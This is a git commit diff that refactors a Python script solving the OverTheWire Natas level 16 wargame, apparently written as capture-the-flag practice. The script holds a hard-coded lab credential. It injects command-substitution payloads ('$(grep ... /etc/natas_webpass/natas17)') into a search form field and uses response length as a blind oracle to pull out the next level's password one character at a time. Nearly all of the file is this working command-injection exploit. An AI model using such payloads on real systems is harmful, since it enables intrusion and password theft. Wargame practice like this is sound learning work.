8cb042ff019ed9dcc6da0b6768b570e5a93e595c
kaniehuest <real-automated@protonmail.com>
2022-12-22 15:42:45 -0300

    Script mejor ordenado

--- Natas-16-17.py
+++ Natas-16-17.py
@@ -1,31 +1,53 @@
 import requests
 import string
 
-characters = string.digits + string.ascii_letters
 URL = "http://natas16.natas.labs.overthewire.org/"
-NATAS16PASSWD = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V" # Cambiar esto
-natas17passwd_characters = ""
-natas17passwd = ""
+NATAS16_PASSWORD = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"  # Change this
 
 s = requests.Session()
-s.auth = ("natas16", NATAS16PASSWD)
+s.auth = ("natas16", NATAS16_PASSWORD)
 
-print("[+] La contraseña contiene esto caracteres: ", end="")
-for i in characters:
-    injection = f"$(grep {i} /etc/natas_webpass/natas17)"
-    data = {"needle": injection, "submit": "true"}
-    r = s.post(URL, data=data)
-    if len(r.content) == 1105:
-        natas17passwd_characters += i
-        print(i, end="", flush=True)
 
-print("\n[!] La contraseña para natas17 es: ", end="")
-for _ in range(32):
-    for i in natas17passwd_characters:
-        injection = f"$(grep ^{natas17passwd + i} /etc/natas_webpass/natas17)"
-        data = {"needle": injection, "submit": "true"}
+def get_valid_characters():
+    print(
+        "[+] The password for natas17 contains these characters: ", end="", flush=True
+    )
+    characters = string.digits + string.ascii_letters
+    valid_characters = ""
+    for character in characters:
+        payload = f"$(grep {character} /etc/natas_webpass/natas17)"
+        data = {"needle": payload, "submit": "true"}
         r = s.post(URL, data=data)
-        if len(r.content) == 1105:
-            natas17passwd += i
-            print(i, end="", flush=True)
 
+        if len(r.content) == 1105:
+            valid_characters += character
+            print(character, end="", flush=True)
+
+    return valid_characters
+
+
+def get_password(valid_characters):
+    print("\n[!] The password for natas17 is: ", end="", flush=True)
+    natas17_password = ""
+    for _ in range(32):
+        for character in valid_characters:
+            payload = (
+                f"$(grep ^{natas17_password + character} /etc/natas_webpass/natas17)"
+            )
+            data = {"needle": payload, "submit": "true"}
+            r = s.post(URL, data=data)
+
+            if len(r.content) == 1105:
+                natas17_password += character
+                print(character, end="", flush=True)
+
+    return natas17_password
+
+
+def main():
+    valid_characters = get_valid_characters()
+    get_password(valid_characters)
+
+
+if __name__ == "__main__":
+    main()
